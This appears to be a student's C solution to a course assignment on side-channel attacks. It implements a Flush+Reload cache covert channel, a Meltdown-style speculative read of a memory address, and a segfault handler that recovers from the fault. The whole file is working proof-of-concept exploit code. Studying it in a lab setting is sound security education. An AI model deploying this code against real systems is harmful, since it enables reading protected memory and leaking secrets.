#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>

#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#define u64 uint64_t
#define i64 int64_t

/*
Task 1 - Build a covert channel (30%)

The covert channel consists of four functions. The function cc_init() initializes the covert channel, 
setting up whatever memory it needs. cc_setup() sets the channel for sending a byte. 
cc_transmit(uint8_t value) transmits a value through the channel, and int cc_receive() returns the 
value it receives, or -1 if no value has been received. In the case that multiple values appear to 
have been sent, the function can arbitrarily choose which one to return.

For a channel, we will use the Flush+Reload attack. Basically, cc_init allocates space for 256 
different cache lines that the transmit function uses. cc_setup flushes these lines from the cache, 
cc_transmit accesses one of these cache lines based on the transmitted value, and cc_receive checks 
which of the cache lines is cached. To overcome prefetchers, we want each of these cache lines to 
reside in a different memory page.

Your task is to implement the four functions, test the accuracy of the covert channel, and report.
*/
static jmp_buf sig_buf;
static void *cc_buffer;
static size_t cc_buf_size = 512 * 4096; // 256 cache lines, 4096 bytes apart (mem pages)
static u64 threshold = 190; // should be below 160 , but whatever
static u64 cc_buf_offset = 512;
static void wait(uint64_t cycles) {
	unsigned int ignore;
	uint64_t start = __rdtscp(&ignore);
	while (__rdtscp(&ignore) - start < cycles);
}

static inline void maccess(void *p) {
    asm volatile("mov eax, [%0]\n" : : "c"(p) : "eax");
}
static void flush(void *p) {
    asm volatile("clflush [%0]\n" : : "c"(p) : "eax");
}

static void my_mfence(){
    asm volatile("mfence\n");
}

static inline u64 my_rdtsc() {
  u64 a = 0, d = 0;
  asm volatile("mfence;rdtscp;mfence;" : "=a"(a), "=d"(d) :: "rcx");
  a = (d << 32) | a;
  return a;
}

static void flush_buf(){
    for (int i=0; i< 256;i++){
        flush(&cc_buffer[cc_buf_offset+i*512+i*4]);
    }
}

static void segfault_handler(int signum) {
    printf("handled segfault\n");
    // sigset_t sigs;
    // sigemptyset(&sigs);
    // sigaddset(&sigs, signum);
    // sigprocmask(SIG_UNBLOCK, &sigs, NULL);
    siglongjmp(sig_buf, 1); 
}


static void cc_init() {
    
	// allocate 256 different cache lines on differenz mem pages
	cc_buffer = mmap(NULL, cc_buf_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	if (cc_buffer == MAP_FAILED) {
        perror("cc_init: mmap failed");
        return;
	}
}

// cc_setup() sets the channel for sending a byte. 
static void cc_setup() {
    memset(cc_buffer, 0xaa, cc_buf_size); // write something -> avoid null page
    flush_buf();
}

// cc_transmit(uint8_t value) transmits a value through the channel
static void cc_transmit(uint8_t value) {
    my_mfence();
    maccess(&cc_buffer[cc_buf_offset+value*512+value*4]);
    my_mfence();
}

// int cc_receive() returns the value it receives, or -1 if no value has been received
static int cc_receive() {
    u64 time, start, end;
    void *cur_adrs;
    for (int i=0; i< 256;i++){
        my_mfence();
        cur_adrs=&cc_buffer[cc_buf_offset+i*512+i*4];
        start = my_rdtsc();
        maccess(cur_adrs);
        end = my_rdtsc();
        my_mfence();
        flush(cur_adrs);
        time = end - start;
        // printf("|%lu;", time); // this stabilizes the measurement lol (uncommented, we get less 254 fails)
        
        if (time<threshold) {
            // printf("\n");
            return i;
        } 
    }
    printf("received nothing\n");
    return -1;
}

static void meltdown(uintptr_t adrs) {
    static volatile int tmp[1024] = {1};
    _mm_clflush((void *)(tmp + 512));
    cc_setup();
    _mm_lfence();
    tmp[512] += 1;
    uint8_t rv = *((uint8_t *)adrs);
    cc_transmit(rv);
}


/* The main problem of the code in meltdown is that if called with 
   an invalid address, it crashes. In this task, you will implement 
   the function int do_meltdown(uintptr_t adrs), which calls 
   meltdown, recovers from the fault, receives the transmitted 
   value from the channel, and returns it. You may want to read the 
   man pages of signal(2) and sigsetjmp(3). Make sure that you can 
   call do_meltdown several times without crash or hang. You may 
   assume that the program does some one-time setup before calling 
   do_meltdown.

*/
static int do_meltdown(uintptr_t adrs) {
    // Init segfault handler
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        printf("Failed to setup signal handler\n");
        return -1;
    }
    my_mfence();
    int ret = -1;
    if (sigsetjmp(sig_buf, 1) == 0) {
    // call meltdown
        my_mfence();
        meltdown(adrs);
    }
    // my_mfence();
    return cc_receive();
}

#ifdef MELTDOWNCASE
int main() {
    wait(1E9);
    cc_init();
    const char *filename = "./file";

    // Open the file
    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }

    // Get the size of the file
    struct stat stat_buf;
    if (fstat(fd, &stat_buf) == -1) {
        perror("Error getting file size");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Map the file into memory
    void *file_ptr = mmap(NULL, stat_buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (file_ptr == MAP_FAILED) {
        perror("Error mapping file to memory");
        close(fd);
        exit(EXIT_FAILURE);
    }
 // Print the pointer and content
    printf("Pointer: %p\n", file_ptr);
    printf("File Content:\n%s\n", (char *)file_ptr);
    
    printf("%i\n", do_meltdown((uintptr_t) file_ptr));
    
    // Close the file descriptor since it's no longer needed
    close(fd);

   
    // Unmap the file from memory
    if (munmap(file_ptr, stat_buf.st_size) == -1) {
        perror("Error unmapping file from memory");
        exit(EXIT_FAILURE);
    }
    printf("%i\n", do_meltdown((uintptr_t) file_ptr));

    return 0;
}
// int main(int ac, char**av){
    // wait(1E9);
    // printf("TODO\n");
    // cc_init();
    // //uint8_t test_num = 8;
    // //meltdown((uintptr_t) &test_num);
    // //printf("%i\n", cc_receive());
    // uintptr_t target = ac==1? (uintptr_t) &cc_buffer[8*283000] : (uintptr_t) av[1];
    // printf("%i\n", do_meltdown( target));
    // printf("%i\n", do_meltdown( target));
    // printf("%i\n", do_meltdown( target));
    // munmap(cc_buffer, cc_buf_size);
    // return 0;
// }
#endif
